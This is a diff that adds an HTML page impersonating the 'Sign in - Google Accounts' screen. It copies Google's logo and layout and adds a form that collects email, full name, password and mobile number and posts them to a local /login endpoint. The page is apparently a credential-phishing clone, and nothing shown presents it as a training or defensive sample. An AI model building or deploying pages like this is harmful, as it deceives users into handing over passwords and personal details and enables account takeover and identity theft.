@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sign in - Google Accounts</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="container">
+    <div class="card">
+      <!-- Google Logo -->
+      <div class="logo">
+        <svg viewBox="0 0 75 24" width="75" height="24">
+          <path fill="#4285F4" d="M67.954 16.303c-1.005 0-1.653-.686-1.653-1.8v-1.346h4.902v-1.524h-4.902v-3.777h-1.772v8.764c0 1.958 1.24 3.192 3.252 3.192.94 0 1.9-.262 2.6-.668l-.403-1.494c-.51.31-1.146.476-1.787.476"/>
+          <path fill="#EA4335" d="M56.097 16.088c-1.494 0-2.856-1.17-2.856-3.45 0-2.28 1.362-3.45 2.856-3.45 1.48 0 2.83 1.146 2.83 3.45 0 2.28-1.35 3.45-2.83 3.45m.014-8.283c-2.657 0-4.76 1.962-4.76 4.833 0 2.88 2.103 4.85 4.76 4.85 2.645 0 4.737-1.97 4.737-4.85 0-2.87-2.092-4.833-4.737-4.833"/>
+          <path fill="#FBBC05" d="M45.09 16.088c-1.495 0-2.857-1.17-2.857-3.45 0-2.28 1.362-3.45 2.857-3.45 1.48 0 2.83 1.146 2.83 3.45 0 2.28-1.35 3.45-2.83 3.45m.014-8.283c-2.658 0-4.76 1.962-4.76 4.833 0 2.88 2.102 4.85 4.76 4.85 2.645 0 4.737-1.97 4.737-4.85 0-2.87-2.092-4.833-4.737-4.833"/>
+          <path fill="#4285F4" d="M29.802 10.37v2.065h3.256c-.265 1.263-1.24 2.092-2.947 2.092-1.95 0-3.394-1.555-3.394-3.522 0-1.967 1.522-3.523 3.394-3.523 1.003 0 1.758.353 2.334.93l1.513-1.504c-.98-.95-2.376-1.642-3.847-1.642-2.918 0-5.347 2.38-5.347 5.74 0 3.358 2.43 5.738 5.347 5.738 2.54 0 4.655-1.628 4.655-4.785 0-.445-.043-.828-.12-1.18h-4.44z"/>
+          <path fill="#34A853" d="M15.002 9.98c0 .797.122 1.398.346 1.902l-2.222 1.723c-.56-.986-.878-2.17-.878-3.625 0-1.456.318-2.637.878-3.624l2.222 1.723c-.224.504-.346 1.105-.346 1.902"/>
+          <path fill="#EA4335" d="M16.822 6.354l-1.474 2.625c.598.467 1.11 1.11 1.11 2.088 0 .977-.512 1.62-1.11 2.088l1.474 2.625c1.187-1.073 2.486-2.907 2.486-4.713 0-1.806-1.3-3.64-2.486-4.713"/>
+          <path fill="#4285F4" d="M17.733 16.92l-1.474-2.625c.094.075.186.156.274.25.494.527.9 1.246.9 2.138 0 .906-.406 1.625-.9 2.152-.088.094-.18.175-.274.25"/>
+          <path fill="#34A853" d="M9.066 14.627c-.225.504-.347 1.105-.347 1.902 0 1.456.318 2.637.878 3.624l2.222-1.723c-.336-.498-.583-1.154-.672-1.86l-2.081.057zM4.504 5.11C2.898 6.796 1.886 9.197 1.886 11.98c0 2.782 1.012 5.183 2.618 6.87L7.42 16.459C6.718 15.65 6.235 14.524 6.235 13.13c0-1.396.483-2.52 1.185-3.33l-2.916-4.69z"/>
+          <path fill="#FBBC05" d="M8.903 4.334l-1.797 2.892c.836.644 1.527 1.698 1.527 3.082 0 1.384-.69 2.437-1.527 3.082l1.797 2.892c1.845-1.382 3.72-3.895 3.72-5.974 0-2.08-1.875-4.592-3.72-5.974"/>
+        </svg>
+      </div>
+
+      <h2>Sign in</h2>
+      <p class="subtitle">Use your Google Account</p>
+
+      <form action="/login" method="POST">
+        <!-- Email or Phone -->
+        <div class="input-group">
+          <div class="input-field">
+            <input type="email" name="email" autocomplete="email" required>
+            <label class="floating-label">Email or phone</label>
+          </div>
+        </div>
+
+        <!-- Full Name -->
+        <div class="input-group">
+          <div class="input-field">
+            <input type="text" name="fullname" required>
+            <label class="floating-label">Full Name</label>
+          </div>
+        </div>
+
+        <!-- Password -->
+        <div class="input-group">
+          <div class="input-field">
+            <input type="password" name="passwd" required>
+            <label class="floating-label">Password</label>
+          </div>
+          <div class="show-password">
+            <label class="checkbox-label">
+              <input type="checkbox" onclick="togglePassword()">
+              <span>Show password</span>
+            </label>
+          </div>
+        </div>
+
+        <!-- Mobile (optional) -->
+        <div class="input-group">
+          <div class="input-field">
+            <input type="tel" name="mobile">
+            <label class="floating-label">Mobile number (optional)</label>
+          </div>
+        </div>
+
+        <div class="forgot-link">
+          <a href="#">Forgot email?</a>
+        </div>
+
+        <div class="guest-text">
+          Not your computer? Use Guest mode to sign in privately.
+          <a href="#">Learn more</a>
+        </div>
+
+        <div class="actions">
+          <a href="#" class="create-account">Create account</a>
+          <button type="submit" class="btn">Next</button>
+        </div>
+      </form>
+    </div>
+
+    <div class="footer">
+      <select class="language-select">
+        <option>English (United States)</option>
+        <option>हिन्दी</option>
+        <option>اردو</option>
+      </select>
+      <div class="footer-links">
+        <a href="#">Help</a>
+        <a href="#">Privacy</a>
+        <a href="#">Terms</a>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    function togglePassword() {
+      var pass = document.querySelector('input[name="passwd"]');
+      if (pass.type === "password") {
+        pass.type = "text";
+      } else {
+        pass.type = "password";
+      }
+    }
+
+    // Floating label effect
+    document.querySelectorAll('.input-field input').forEach(input => {
+      input.addEventListener('focus', function() {
+        this.parentElement.classList.add('focused');
+      });
+      input.addEventListener('blur', function() {
+        if (this.value === '') {
+          this.parentElement.classList.remove('focused');
+        }
+      });
+      // On page load, if input has value, keep label up
+      if (input.value !== '') {
+        input.parentElement.classList.add('focused');
+      }
+    });
+  </script>
+</body>
+</html>
